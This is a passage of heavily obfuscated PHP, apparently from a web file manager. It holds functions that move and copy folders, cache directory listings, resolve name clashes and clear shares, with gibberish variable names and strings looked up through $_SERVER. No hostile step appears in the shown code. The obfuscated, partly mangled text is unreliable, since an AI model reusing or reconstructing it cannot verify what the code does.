$¿İ±ış¨[50]; $Ã¿†´ÙË = $this->parentLevelArray($¤ş•‚); $¼æşú¡• = $Ã¿†´ÙË[count($Ã¿†´ÙË) - 1]; return array($¿İ±ış¨[193] => $¼æşú¡•, $¿İ±ış¨[589] => $¤ş•‚); } private function _makeItemData($÷ŞĞû­Ï, $äîšÕÂò, $îÁü˜À´) { $½á§Õ±ø =& $_SERVER[ÅÄÇĞô]; $ÎçúÊçã = array($½á§Õ±ø[654] => $÷ŞĞû­Ï[$½á§Õ±ø[488]], $½á§Õ±ø[497] => $îÁü˜À´, $½á§Õ±ø[655] => $÷ŞĞû­Ï[$½á§Õ±ø[489]] ? $÷ŞĞû­Ï[$½á§Õ±ø[489]] : $½á§Õ±ø[12], $½á§Õ±ø[547] => $÷ŞĞû­Ï[$½á§Õ±ø[546]] ? $÷ŞĞû­Ï[$½á§Õ±ø[546]] : 0, $½á§Õ±ø[625] => $÷ŞĞû­Ï[$½á§Õ±ø[79]] ? $÷ŞĞû­Ï[$½á§Õ±ø[79]] : 0, $½á§Õ±ø[656] => intval($äîšÕÂò[$½á§Õ±ø[191]]), $½á§Õ±ø[657] => intval($äîšÕÂò[$½á§Õ±ø[574]]), $½á§Õ±ø[658] => intval(USER_ID), $½á§Õ±ø[659] => intval(USER_ID), $½á§Õ±ø[480] => intval($äîšÕÂò[$½á§Õ±ø[194]]), $½á§Õ±ø[660] => $äîšÕÂò[$½á§Õ±ø[589]] . $äîšÕÂò[$½á§Õ±ø[194]] . $½á§Õ±ø[50], $½á§Õ±ø[501] => $÷ŞĞû­Ï[$½á§Õ±ø[88]] ? $÷ŞĞû­Ï[$½á§Õ±ø[88]] : time(), $½á§Õ±ø[507] => 0, $½á§Õ±ø[661] => $½á§Õ±ø[12]); return $ÎçúÊçã; } private function _copyApplyMeta($É›£«Ä÷, &$¦òí’Åñ) { $«£²Ëá =& $_SERVER[ÅÄÇĞô]; $®…ãø = $É›£«Ä÷[$«£²Ëá[194]]; $½ä†Š”† = $É›£«Ä÷[$«£²Ëá[32]]; if (!isset($É›£«Ä÷[$«£²Ëá[662]]) || !$É›£«Ä÷[$«£²Ëá[662]] || $É›£«Ä÷[$«£²Ëá[662]] == $«£²Ëá[231]) { $¦òí’Åñ[$«£²Ëá[639]][] = array($«£²Ëá[194], $®…ãø, $«£²Ëá[662], short_id($®…ãø)); } if (Input::check($½ä†Š”†, $«£²Ëá[663])) { $¦òí’Åñ[$«£²Ëá[638]][] = array($«£²Ëá[194] => $®…ãø, $«£²Ëá[97] => $«£²Ëá[541], $«£²Ëá[453] => str_replace($«£²Ëá[53], $«£²Ëá[12], Pinyin::get($½ä†Š”†))); $¦òí’Åñ[$«£²Ëá[638]][] = array($«£²Ëá[194] => $®…ãø, $«£²Ëá[97] => $«£²Ëá[540], $«£²Ëá[453] => Pinyin::get($½ä†Š”†, $«£²Ëá[664])); } $¦òí’Åñ[$«£²Ëá[638]][] = array($«£²Ëá[194] => $®…ãø, $«£²Ëá[97] => $«£²Ëá[520], $«£²Ëá[453] => KodSort::makeStr($½ä†Š”†)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($‘ù­¯é) { $¸çÎîÖø =& $_SERVER[ÅÄÇĞô]; $òÎ°ßÌ¼ = $this->sourceInfo($‘ù­¯é); $ÀîîŒ€á = $¸çÎîÖø[665]; $ùêÌ¢á— = array($¸çÎîÖø[589] => array($¸çÎîÖø[620], $òÎ°ßÌ¼[$¸çÎîÖø[589]] . $‘ù­¯é . $¸çÎîÖø[621]), $¸çÎîÖø[508] => $this->targetIsDelete); $§±ÙŠı = $this->field($ÀîîŒ€á)->where($ùêÌ¢á—)->select(); if (!$§±ÙŠı) { return; } $§±ÙŠı = array_to_keyvalue($§±ÙŠı, $¸çÎîÖø[194]); foreach ($§±ÙŠı as $ƒ¡Û üó) { $ÕÇ³÷©ğ = $ƒ¡Û üó[$¸çÎîÖø[193]]; $‘ù­¯é = $ƒ¡Û üó[$¸çÎîÖø[194]]; if (!isset($this->_childrenListCache[$‘ù­¯é]) && $ƒ¡Û üó[$¸çÎîÖø[488]] == $¸çÎîÖø[91]) { $this->_childrenListCache[$‘ù­¯é] = array(); } if (!isset($this->_childrenListCache[$ÕÇ³÷©ğ])) { $this->_childrenListCache[$ÕÇ³÷©ğ] = array(); } $this->_childrenListCache[$ÕÇ³÷©ğ][$‘ù­¯é] = $ƒ¡Û üó; $this->_childrenItemCache[$‘ù­¯é] = $ƒ¡Û üó; } } private function _childrenListAll($÷øı¼˜, &$—¤Êâ†) { $ÕÓÖ‘€• =& $_SERVER[ÅÄÇĞô]; if (!isset($this->_childrenListCache[$÷øı¼˜])) { return; } $“Ë©¥¶í = $this->_childrenListCache[$÷øı¼˜]; foreach ($“Ë©¥¶í as $ïğúĞÂ => $´­İ‹ò‹) { $—¤Êâ†[$ïğúĞÂ] = $´­İ‹ò‹; if ($´­İ‹ò‹[$ÕÓÖ‘€•[488]] == $ÕÓÖ‘€•[91]) { $this->_childrenListAll($ïğúĞÂ, $—¤Êâ†); } } } private function sourceInfoCache($à•ä¾á) { if (isset($this->_childrenItemCache[$à•ä¾á])) { return $this->_childrenItemCache[$à•ä¾á]; } return $this->sourceInfo($à•ä¾á); } private function _childrenList($ØšÄæ…’) { if (isset($this->_childrenListCache[$ØšÄæ…’])) { return $this->_childrenListCache[$ØšÄæ…’]; } return $this->_childrenListSelect($ØšÄæ…’); } private function _childrenListSelect($âœ–©í­) { $‰œâéˆ˜ =& $_SERVER[ÅÄÇĞô]; $•òı¸ï‹ = array($‰œâéˆ˜[193] => $âœ–©í­, $‰œâéˆ˜[508] => $this->targetIsDelete); $ÉƒÃÂ¨ü = $this->where($•òı¸ï‹)->select(); $ÉƒÃÂ¨ü = $ÉƒÃÂ¨ü ? $ÉƒÃÂ¨ü : array(); $­èŠ¼íû = array_to_keyvalue($ÉƒÃÂ¨ü, $‰œâéˆ˜[194]); $this->_childrenListCache[$âœ–©í­] = $­èŠ¼íû; foreach ($­èŠ¼íû as $âœ–©í­ => $ƒÙä’Ÿñ) { $this->_childrenItemCache[$âœ–©í­] = $ƒÙä’Ÿñ; } return $­èŠ¼íû; } private function fileNameExistAuto($†÷¨Şá, $Ş¾¢ÃŠ¦) { $„Ñšúè« =& $_SERVER[ÅÄÇĞô]; if ($Ş¾¢ÃŠ¦[$„Ñšúè«[508]] == $„Ñšúè«[91]) { return $this->fileNameExist($†÷¨Şá, $Ş¾¢ÃŠ¦[$„Ñšúè«[32]]); } return $this->fileNameExistCache($†÷¨Şá, $Ş¾¢ÃŠ¦[$„Ñšúè«[32]]); } private function fileNameExistCache($Š§¢­ˆœ, $¬Üİã¸†) { $Šıß—´Ï =& $_SERVER[ÅÄÇĞô]; $¬Üİã¸† = strtolower($¬Üİã¸†); $‰²±¼¾Ê = $this->_childrenList($Š§¢­ˆœ); foreach ($‰²±¼¾Ê as $¦¹ñš) { if ($¬Üİã¸† == strtolower($¦¹ñš[$Šıß—´Ï[32]])) { return $¦¹ñš[$Šıß—´Ï[194]]; } } return !1; } private function fileNameAutoCache($à¶‹Ï˜«, $ú¬æıó¦, $ç—úÍÀí, $üıÙ¿¤) { $ØÀ²à® =& $_SERVER[ÅÄÇĞô]; $äê›Á¹Î = $this->_childrenList($à¶‹Ï˜«); $ÜÎ¼´ïâ = array_to_keyvalue($äê›Á¹Î, $ØÀ²à®[12], $ØÀ²à®[32]); return $this->fileNameAutoGet($ÜÎ¼´ïâ, $ú¬æıó¦, $ç—úÍÀí, $üıÙ¿¤); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ı·æ’, $±¸ª¢àÍ, $ÕÏ¶Ä« = REPEAT_REPLACE, $ÁÔÆ‘ôÛ = '') { $òöıÍÖµ =& $_SERVER[ÅÄÇĞô]; $’Éáå’Ğ = $this->sourceInfo($ı·æ’); $û¢ØÙ‹Ğ = $this->sourceInfo($±¸ª¢àÍ); if ($’Éáå’Ğ[$òöıÍÖµ[193]] == $û¢ØÙ‹Ğ[$òöıÍÖµ[194]]) { if ($’Éáå’Ğ[$òöıÍÖµ[508]] == $òöıÍÖµ[91]) { Model($òöıÍÖµ[506])->restore(array($ı·æ’)); } if (!$ÁÔÆ‘ôÛ || $ÁÔÆ‘ôÛ == $’Éáå’Ğ[$òöıÍÖµ[32]]) { return $ı·æ’; } } $³‹ß¾ª— = $this->pathInfoMore($ı·æ’); if ($this->isParentOf($ı·æ’, $±¸ª¢àÍ)) { return !1; } if (!$’Éáå’Ğ || !$û¢ØÙ‹Ğ || $û¢ØÙ‹Ğ[$òöıÍÖµ[488]] != $òöıÍÖµ[91]) { return !1; } Hook::trigger($òöıÍÖµ[666], $³‹ß¾ª—); $this->targetIsDelete = intval($’Éáå’Ğ[$òöıÍÖµ[508]]); if ($’Éáå’Ğ[$òöıÍÖµ[193]] == $±¸ª¢àÍ && $ÁÔÆ‘ôÛ != $’Éáå’Ğ[$òöıÍÖµ[32]]) { $ÎÀ­«’‰ = $this->fileNameExist($±¸ª¢àÍ, $ÁÔÆ‘ôÛ); if ($ÎÀ­«’‰ && $’Éáå’Ğ[$òöıÍÖµ[488]] == $òöıÍÖµ[231]) { $èäˆûá´ = $this->sourceInfo($ÎÀ­«’‰); $Å¦£‰é = $this->fileHistory($èäˆûá´, $’Éáå’Ğ[$òöıÍÖµ[546]], $’Éáå’Ğ[$òöıÍÖµ[79]]); if (!$Å¦£‰é) { Model($òöıÍÖµ[549])->remove($’Éáå’Ğ[$òöıÍÖµ[546]]); } $this->removeNow($ı·æ’, !1); $this->folderSizeReset($±¸ª¢àÍ); Hook::trigger($òöıÍÖµ[667], $³‹ß¾ª—); return $ÎÀ­«’‰; } } $×Û‘ —ó = $ÁÔÆ‘ôÛ ? $ÁÔÆ‘ôÛ : $’Éáå’Ğ[$òöıÍÖµ[32]]; $this->lockMoveStart($ı·æ’); $this->lockWriteStart($±¸ª¢àÍ, $×Û‘ —ó); $ğÌ”ß¬¦ = array($òöıÍÖµ[637] => array(), $òöıÍÖµ[668] => !1); $this->clearShare($ı·æ’, $±¸ª¢àÍ); $ş÷Ì¶š = $this->fileNameExistAuto($±¸ª¢àÍ, $’Éáå’Ğ); $ñû™µŸõ = $this->_move($ı·æ’, $±¸ª¢àÍ, $ÕÏ¶Ä«, $ğÌ”ß¬¦, $ÁÔÆ‘ôÛ); $this->sourceCacheClear(); if ($’Éáå’Ğ[$òöıÍÖµ[488]] == $òöıÍÖµ[91] && $ş÷Ì¶š) { $this->folderSizeResetChildren($ñû™µŸõ); } Model($òöıÍÖµ[233])->linkAdd($ğÌ”ß¬¦[$òöıÍÖµ[637]]); if ($ñû™µŸõ && $ş÷Ì¶š && $ğÌ”ß¬¦[$òöıÍÖµ[668]]) { $è»¾Û¢³ = $’Éáå’Ğ[$òöıÍÖµ[488]] == $òöıÍÖµ[91] ? $this->_childrenListSelect($ı·æ’) : !1; $£×Ã…Å = $è»¾Û¢³ && count($è»¾Û¢³) > 0 ? !0 : !1; $this->removeNow($ı·æ’, $£×Ã…Å); } $this->lockMoveEnd($ı·æ’); $this->lockWriteEnd($±¸ª¢àÍ, $×Û‘ —ó); $this->folderSizeReset($’Éáå’Ğ[$òöıÍÖµ[193]]); $this->folderSizeReset($±¸ª¢àÍ); $Èâ¯½«ª = array($’Éáå’Ğ[$òöıÍÖµ[193]], $±¸ª¢àÍ); if ($’Éáå’Ğ[$òöıÍÖµ[488]] == $òöıÍÖµ[91]) { $Èâ¯½«ª[] = $ı·æ’; } $this->updateModifyTime($Èâ¯½«ª); Model($òöıÍÖµ[641])->eventMove($ı·æ’, $’Éáå’Ğ[$òöıÍÖµ[193]], $±¸ª¢àÍ); Hook::trigger($òöıÍÖµ[667], $³‹ß¾ª—); return $ñû™µŸõ; } private function _move($ªÁÁõéÛ, $éÅ¥¥Ì, $­Ø¹¨ªÜ, &$äÜÍ¶¾†, $‹¾õ‚°¥ = '') { $İÕ­°¬â =& $_SERVER[ÅÄÇĞô]; $¬Ù©ö£Õ = $this->sourceInfo($ªÁÁõéÛ); $ğ‹û‰êÁ = $¬Ù©ö£Õ[$İÕ­°¬â[488]] == $İÕ­°¬â[91]; $ è¬à¤ = $‹¾õ‚°¥ ? $‹¾õ‚°¥ : $¬Ù©ö£Õ[$İÕ­°¬â[32]]; $®‹ùìÀÕ = $this->fileNameExistAuto($éÅ¥¥Ì, $¬Ù©ö£Õ); $this->lockMoveStart($ªÁÁõéÛ); $this->lockWriteStart($éÅ¥¥Ì, $ è¬à¤); if (!$®‹ùìÀÕ) { return $this->_moveForce($ªÁÁõéÛ, $éÅ¥¥Ì, $ è¬à¤); } $ÃÃ¹çí = $®‹ùìÀÕ; $èÜÂ¢”­ = !1; if ($ğ‹û‰êÁ) { if ($­Ø¹¨ªÜ == REPEAT_RENAME_FOLDER) { $ è¬à¤ = $this->fileNameAuto($éÅ¥¥Ì, $ è¬à¤, $­Ø¹¨ªÜ, $ğ‹û‰êÁ); $ÃÃ¹çí = $this->_moveForce($ªÁÁõéÛ, $éÅ¥¥Ì, $ è¬à¤); } else { $ÃŞ³¢€ş = $this->_childrenListSelect($ªÁÁõéÛ); foreach ($ÃŞ³¢€ş as $˜¹¯Ğ¡ò) { $˜¿à˜ş = REPEAT_REPLACE; $this->_move($˜¹¯Ğ¡ò[$İÕ­°¬â[194]], $®‹ùìÀÕ, $˜¿à˜ş, $äÜÍ¶¾†); } $èÜÂ¢”­ = !0; } } else { if ($­Ø¹¨ªÜ == REPEAT_RENAME || $­Ø¹¨ªÜ == REPEAT_RENAME_FOLDER) { $ è¬à¤ = $this->fileNameAuto($éÅ¥¥Ì, $ è¬à¤, $­Ø¹¨ªÜ, $ğ‹û‰êÁ); $ÃÃ¹çí = $this->_moveForce($ªÁÁõéÛ, $éÅ¥¥Ì, $ è¬à¤); } else { $¬óøÎ˜ï = $this->sourceInfoCache($®‹ùìÀÕ); $İ…’Ááê = $this->fileHistory($¬óøÎ˜ï, $¬Ù©ö£Õ[$İÕ­°¬â[546]], $¬Ù©ö£Õ[$İÕ­°¬â[79]]); if ($İ…’Ááê) { $äÜÍ¶¾†[$İÕ­°¬â[637]][] = $¬Ù©ö£Õ[$İÕ­°¬â[546]]; } $èÜÂ¢”­ = !0; } } if ($èÜÂ¢”­) { $äÜÍ¶¾†[$İÕ­°¬â[668]] = !0; } return $ÃÃ¹çí; } private function _moveForce($Å‘¾Ş·, $µåıÊ«Ü, $Â€…†ÒÜ) { $Õ“ŞØ²¨ =& $_SERVER[ÅÄÇĞô]; $¡ÄÎ ¡ = $this->sourceInfo($Å‘¾Ş·); $¯˜ç’»É = $this->sourceInfo($µåıÊ«Ü); $œ‘…—Êõ = $¡ÄÎ ¡[$Õ“ŞØ²¨[488]] == $Õ“ŞØ²¨[91]; $–×è“›á = array($Õ“ŞØ²¨[480] => $¯˜ç’»É[$Õ“ŞØ²¨[194]], $Õ“ŞØ²¨[660] => $¯˜ç’»É[$Õ“ŞØ²¨[589]] . $¯˜ç’»É[$Õ“ŞØ²¨[194]] . $Õ“ŞØ²¨[50], $Õ“ŞØ²¨[656] => $¯˜ç’»É[$Õ“ŞØ²¨[191]], $Õ“ŞØ²¨[657] => $¯˜ç’»É[$Õ“ŞØ²¨[574]], $Õ“ŞØ²¨[659] => USER_ID, $Õ“ŞØ²¨[497] => $Â€…†ÒÜ); $”æ±ñĞ = $¡ÄÎ ¡[$Õ“ŞØ²¨[191]] == SourceModel::TYPE_GROUP && $¯˜ç’»É[$Õ“ŞØ²¨[191]] == SourceModel::TYPE_GROUP && $¡ÄÎ ¡[$Õ“ŞØ²¨[574]] == $¯˜ç’»É[$Õ“ŞØ²¨[574]]; if (!$”æ±ñĞ && $this->moveClearAuth) { Model($Õ“ŞØ²¨[572])->authClear($Å‘¾Ş·); } $··Ü€Äè = $¡ÄÎ ¡[$Õ“ŞØ²¨[508]] == $Õ“ŞØ²¨[91] && $¯˜ç’»É[$Õ“ŞØ²¨[508]] != $Õ“ŞØ²¨[91]; if ($··Ü€Äè) { $–×è“›á[$Õ“ŞØ²¨[507]] = 0; } if ($œ‘…—Êõ) { $€è†–˜ = array($Õ“ŞØ²¨[660] => array($Õ“ŞØ²¨[620], $¡ÄÎ ¡[$Õ“ŞØ²¨[589]] . $¡ÄÎ ¡[$Õ“ŞØ²¨[194]] . $Õ“ŞØ²¨[621])); $éì‡˜—‰ = $¡ÄÎ ¡[$Õ“ŞØ²¨[589]] . $¡ÄÎ ¡[$Õ“ŞØ²¨[194]] . $Õ“ŞØ²¨[50]; $ëëÕ¥±£ = $¯˜ç’»É[$Õ“ŞØ²¨[589]] . $¯˜ç’»É[$Õ“ŞØ²¨[194]] . $Õ“ŞØ²¨[50] . $¡ÄÎ ¡[$Õ“ŞØ²¨[194]] . $Õ“ŞØ²¨[50]; $åˆş›úê = array($Õ“ŞØ²¨[660] => array($Õ“ŞØ²¨[669], "\162\x65\x70\x6c\141\143\x65\50\x70\x61\x72\145\156\164\114\145\166\145\154\x2c\x27{$éì‡˜—‰}\47\x2c\47{$ëëÕ¥±£}\x27\x29"), $Õ“ŞØ²¨[656] => $¯˜ç’»É[$Õ“ŞØ²¨[191]], $Õ“ŞØ²¨[657] => $¯˜ç’»É[$Õ“ŞØ²¨[574]]); if ($··Ü€Äè) { $åˆş›úê[$Õ“ŞØ²¨[507]] = 0; } $this->where($€è†–˜)->data($åˆş›úê)->save(); } $this->where(array($Õ“ŞØ²¨[494] => $Å‘¾Ş·))->data($–×è“›á)->save(); return $Å‘¾Ş·; } private function clearShare($Õ¦˜±ˆÙ, $¾¿ÂŞ¨Ó) { $ª¢É×ö =& $_SERVER[ÅÄÇĞô]; $¿íÜö¸§ = $this->sourceInfo($Õ¦˜±ˆÙ); $áàË‡ûâ = $this->sourceInfo($¾¿ÂŞ¨Ó); if ($¿íÜö¸§[$ª¢É×ö[574]] == $áàË‡ûâ[$ª¢É×ö[574]] && $¿íÜö¸§[$ª¢É×ö[191]] == $ª¢É×ö[670]) { return; } $Ùêä½Òœ = array($ª¢É×ö[589] => array($ª¢É×ö[620], $¿íÜö¸§[$ª¢É×ö[589]] . $Õ¦˜±ˆÙ . $ª¢É×ö[621])); $‡”é¸‰ƒ = $this->field($ª¢É×ö[494])->where($Ùêä½Òœ)->getField($ª¢É×ö[194], !0); if (!$‡”é¸‰ƒ) { return; } $Ùêä½Òœ = array($ª¢É×ö[194] => array($ª¢É×ö[7], $‡”é¸‰ƒ), $ª¢É×ö[671] => 1); $¸İ’¨é° = Model($ª¢É×ö[672])->field($ª¢É×ö[673])->where($Ùêä½Òœ)->select(); if (!$¸İ’¨é°) { return; } $¸İ’¨é° = array_to_keyvalue($¸İ’¨é°, $ª¢É×ö[12], $ª¢É×ö[673]); $Ùêä½Òœ = array($ª¢É×ö[673] => array($ª¢É×ö[7], $¸İ’¨é°)); Model($ª¢É×ö[672])->where($Ùêä½Òœ)->save(array($ª¢É×ö[671] => 0)); Model($ª¢É×ö[674])->where($Ùêä½Òœ)->delete(); } public function copyFolderFromIO($·ïïèø , $“°€…î, $ÙÄùŞ¯°, $¸ÓÛ®“, $Ç½¼‹ê, $Œª»’¾æ = false) { $™Öğ˜óĞ =& $_SERVER[ÅÄÇĞô]; $•ÌâÜÔ = array($™Öğ˜óĞ[638] => array(), $™Öğ˜óĞ[639] => array(), $™Öğ˜óĞ[637] => array(), $™Öğ˜óĞ[675] => array()); $‘ƒ—âØµ = $Œª»’¾æ ? $Œª»’¾æ : $·ïïèø ->pathThis($“°€…î); $ÔÚöäÑå = $this->fileNameExist($ÙÄùŞ¯°, $‘ƒ—âØµ); $÷‹¶ÛÒ× = $this->mkdir($ÙÄùŞ¯°, $‘ƒ—âØµ, $¸ÓÛ®“); if (!$ÔÚöäÑå || $¸ÓÛ®“ == REPEAT_RENAME_FOLDER) { $¸ÓÛ®“ = !1; } if ($ÔÚöäÑå) { $this->_childrenAllMake($ÔÚöäÑå); } Hook::trigger($™Öğ˜óĞ[676]); $this->_copyChildTo($·ïïèø , $“°€…î, $÷‹¶ÛÒ×, $¸ÓÛ®“, $•ÌâÜÔ, $Ç½¼‹ê); Hook::trigger($™Öğ˜óĞ[677]); if ($÷‹¶ÛÒ×) { $this->folderSizeResetChildren($÷‹¶ÛÒ×); } $this->_childrenListClear(); Model($™Öğ˜óĞ[640])->addAll($•ÌâÜÔ[$™Öğ˜óĞ[638]], array(), !0); Model($™Öğ˜óĞ[641])->eventCopy($÷‹¶ÛÒ×); $this->saveAll($•ÌâÜÔ[$™Öğ˜óĞ[639]]); Model($™Öğ˜óĞ[549])->linkAdd($•ÌâÜÔ[$™Öğ˜óĞ[637]]); Model($™Öğ˜óĞ[549])->remove($•ÌâÜÔ[$™Öğ˜óĞ[675]]); $this->folderSizeReset($ÙÄùŞ¯°); $this->updateModifyTime($ÙÄùŞ¯°); return $÷‹¶ÛÒ×; } private function _copyChildTo($¡íÊÈš’, $Óû¯Óºê, $¡­‹ À¹, $ª”Ì“¥¡, &$ì±î×½Æ, $êÙ©ß) { $íÄ‘†í =& $_SERVER[ÅÄÇĞô]; $ôÀ¦ğ’¯ = $this->sourceInfoCache($¡­‹ À¹); $È»ååÍİ = $¡íÊÈš’->listPath($Óû¯Óºê); $È»ååÍİ = $È»ååÍİ ? $È»ååÍİ : array($íÄ‘†í[86] => array(), $íÄ‘†í[85] => array()); $Ñœ³ ³ = array_merge($È»ååÍİ[$íÄ‘†í[86]], $È»ååÍİ[$íÄ‘†í[85]]); $ÕûÂÊÑ¥ = $this->_addFiles($¡íÊÈš’, $È»ååÍİ[$íÄ‘†í[86]], $êÙ©ß); $òê×˜™ = array(); foreach ($Ñœ³ ³ as &$…ÓÚ®½¥) { if (isset($ÕûÂÊÑ¥[$…ÓÚ®½¥[$íÄ‘†í[32]]])) { $…ÓÚ®½¥ = $ÕûÂÊÑ¥[$…ÓÚ®½¥[$íÄ‘†í[32]]]; } $…ÓÚ®½¥[$íÄ‘†í[488]] = $…ÓÚ®½¥[$íÄ‘†í[33]] == $íÄ‘†í[78]; $…ÓÚ®½¥[$íÄ‘†í[489]] = substr(_get($…ÓÚ®½¥, $íÄ‘†í[169], $íÄ‘†í[12]), 0, 10); $…ÓÚ®½¥[$íÄ‘†í[79]] = _get($…ÓÚ®½¥, $íÄ‘†í[79], 0); $…ÓÚ®½¥[$íÄ‘†í[546]] = _get($…ÓÚ®½¥, $íÄ‘†í[546], 0); if (!isset($…ÓÚ®½¥[$íÄ‘†í[678]]) && $…ÓÚ®½¥[$íÄ‘†í[546]]) { $ì±î×½Æ[$íÄ‘†í[675]][] = $…ÓÚ®½¥[$íÄ‘†í[546]]; } if ($ª”Ì“¥¡) { $ëùÎ¼ˆ÷ = $this->fileNameExistCache($¡­‹ À¹, $…ÓÚ®½¥[$íÄ‘†í[32]]); if ($ëùÎ¼ˆ÷) { if ($…ÓÚ®½¥[$íÄ‘†í[488]] || $ª”Ì“¥¡ == REPEAT_SKIP) { continue; } if ($ª”Ì“¥¡ == REPEAT_REPLACE) { $Ùåå²ÄÌ = $this->sourceInfoCache($ëùÎ¼ˆ÷); $Ù‹Í¹áâ = $this->fileHistory($Ùåå²ÄÌ, $…ÓÚ®½¥[$íÄ‘†í[546]], $…ÓÚ®½¥[$íÄ‘†í[79]]); if ($Ù‹Í¹áâ) { $ì±î×½Æ[$íÄ‘†í[637]][] = $…ÓÚ®½¥[$íÄ‘†í[546]]; } continue; } else { if ($ª”Ì“¥¡ == REPEAT_RENAME) { $…ÓÚ®½¥[$íÄ‘†í[32]] = $this->fileNameAutoCache($¡­‹ À¹, $…ÓÚ®½¥[$íÄ‘†í[32]], $ª”Ì“¥¡, !1); } } } } if (!$…ÓÚ®½¥[$íÄ‘†í[488]] && $…ÓÚ®½¥[$íÄ‘†í[546]] == 0) { continue; } if (!$…ÓÚ®½¥[$íÄ‘†í[488]] && $…ÓÚ®½¥[$íÄ‘†í[546]]) { $ì±î×½Æ[$íÄ‘†í[637]][] = $…ÓÚ®½¥[$íÄ‘†í[546]]; } $òê×˜™[] = $this->_makeItemData($…ÓÚ®½¥, $ôÀ¦ğ’¯, $…ÓÚ®½¥[$íÄ‘†í[32]]); } unset($…ÓÚ®½¥); if (!empty($òê×˜™)) { $this->addAll($òê×˜™); $this->_childrenListSelect($¡­‹ À¹); } $ñÙòÜã’ = $this->_childrenList($¡­‹ À¹); $ñÙòÜã’ = array_to_keyvalue($ñÙòÜã’, $íÄ‘†í[32]); foreach ($Ñœ³ ³ as $…ÓÚ®½¥) { $Ùåå²ÄÌ = $ñÙòÜã’[$…ÓÚ®½¥[$íÄ‘†í[32]]]; $àÜšÚü¸ = $Ùåå²ÄÌ[$íÄ‘†í[194]]; $this->_copyApplyMeta($Ùåå²ÄÌ, $ì±î×½Æ); if ($…ÓÚ®½¥[$íÄ‘†í[33]] == $íÄ‘†í[78]) { $…ÓÚ®½¥[$íÄ‘†í[87]] = $¡íÊÈš’->getPathInner($…ÓÚ®½¥[$íÄ‘†í[87]]); $this->_copyChildTo($¡íÊÈš’, $…ÓÚ®½¥[$íÄ‘†í[87]], $àÜšÚü¸, $ª”Ì“¥¡, $ì±î×½Æ, $êÙ©ß); } } } private function _addFiles($”»çİ°, $ÙÕÕ†ıû, $·ÕÙí«ö) { $Ô±õ»Œ =& $_SERVER[ÅÄÇĞô]; if (!$ÙÕÕ†ıû || count($ÙÕÕ†ıû) == 0) { return array(); } $²¼‰Î = array(); foreach ($ÙÕÕ†ıû as &$ëàÆ—’ö) { Hook::trigger($Ô±õ»Œ[679], $ëàÆ—’ö); $ëàÆ—’ö[$Ô±õ»Œ[87]] = $”»çİ°->getPathInner($ëàÆ—’ö[$Ô±õ»Œ[87]]); $Ï›«Ê¥à = $”»çİ°->hashSimple($ëàÆ—’ö[$Ô±õ»Œ[87]]); $Î§‹ì = $”»çİ°->hashMd5($ëàÆ—’ö[$Ô±õ»Œ[87]]); if (strlen($Î§‹ì) > 10 && !isset($²¼‰Î[$Î§‹ì])) { $²¼‰Î[$Î§‹ì] = array(); } $ëàÆ—’ö[$Ô±õ»Œ[680]] = $Ï›«Ê¥à; $ëàÆ—’ö[$Ô±õ»Œ[552]] = $Î§‹ì; $²¼‰Î[$Î§‹ì][] =& $ëàÆ—’ö; if (count($²¼‰Î[$Î§‹ì]) > 1) { $ëàÆ—’ö[$Ô±õ»Œ[678]] = !0; } Hook::trigger($Ô±õ»Œ[681], $ëàÆ—’ö); } unset($ëàÆ—’ö); $ñÎ˜ª©É = array($Ô±õ»Œ[552] => array($Ô±õ»Œ[7], array_keys($²¼‰Î))); $‰®ÕÕàò = Model($Ô±õ»Œ[682]); $ê›•¼Ã’ = $‰®ÕÕàò->where($ñÎ˜ª©É)->select(); $ê›•¼Ã’ = $ê›•¼Ã’ ? $ê›•¼Ã’ : array(); foreach ($ê›•¼Ã’ as $¶ı¦ºş) { if (!isset($²¼‰Î[$¶ı¦ºş[$Ô±õ»Œ[552]]])) { continue; } $Ş¥ö¶’À = $²¼‰Î[$¶ı¦ºş[$Ô±õ»Œ[552]]]; foreach ($Ş¥ö¶’À as &$ëàÆ—’ö) { $ëàÆ—’ö[$Ô±õ»Œ[546]] = $¶ı¦ºş[$Ô±õ»Œ[546]]; $ëàÆ—’ö[$Ô±õ»Œ[678]] = !0; } unset($ëàÆ—’ö); } $À·øÊ’­ = array(); foreach ($ÙÕÕ†ıû as $·şÇôËª) { Hook::trigger($Ô±õ»Œ[683], $·şÇôËª); if (isset($·şÇôËª[$Ô±õ»Œ[678]]) && $·şÇôËª[$Ô±õ»Œ[678]]) { Hook::trigger($Ô±õ»Œ[684], $·şÇôËª); continue; } $œÌ‰¾ø– = $”»çİ°->getPathInner($·şÇôËª[$Ô±õ»Œ[87]]); $­÷±ò‚ê = $‰®ÕÕàò->addFileMake($œÌ‰¾ø–, $·şÇôËª[$Ô±õ»Œ[79]], $·şÇôËª[$Ô±õ»Œ[680]], $·şÇôËª[$Ô±õ»Œ[552]], $·şÇôËª[$Ô±õ»Œ[32]], $·ÕÙí«ö); Hook::trigger($Ô±õ»Œ[684], $·şÇôËª); if (!is_array($­÷±ò‚ê)) { continue; } $À·øÊ’­[] = $­÷±ò‚ê; } $‰®ÕÕàò->addAll($À·øÊ’­); $ñÎ˜ª©É = array($Ô±õ»Œ[552] => array($Ô±õ»Œ[7], array_keys($²¼‰Î))); $ê›•¼Ã’ = $‰®ÕÕàò->where($ñÎ˜ª©É)->select(); $ê›•¼Ã’ = $ê›•¼Ã’ ? $ê›•¼Ã’ : array(); foreach ($ê›•¼Ã’ as $¶ı¦ºş) { if (!isset($²¼‰Î[$¶ı¦ºş[$Ô±õ»Œ[552]]])) { continue; } $‘œ¾•ª =& $²¼‰Î[$¶ı¦ºş[$Ô±õ»Œ[552]]]; foreach ($‘œ¾•ª as &$ëàÆ—’ö) { $ëàÆ—’ö[$Ô±õ»Œ[546]] = $¶ı¦ºş[$Ô±õ»Œ[546]]; } unset($ëàÆ—’ö); } $Ô²øË¬š = array(); foreach ($ÙÕÕ†ıû as $ÃÑÄÊÚÄ) { $Ô²øË¬š[$ÃÑÄÊÚÄ[$Ô±õ»Œ[32]]] = $ÃÑÄÊÚÄ; } return $Ô²øË¬š; } } define($_SERVER[ÅÄÇĞô][685], $_SERVER[ÅÄÇĞô][686]); $rmbdnxkhjz = $_SERVER[ÅÄÇĞô][687]; goto F“ØÓ²Ö–ô; bÙ¹‹ØŠ¥Š: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $×ØöÊ…¤ =& $_SERVER[ÅÄÇĞô]; if (self::$handle) { return 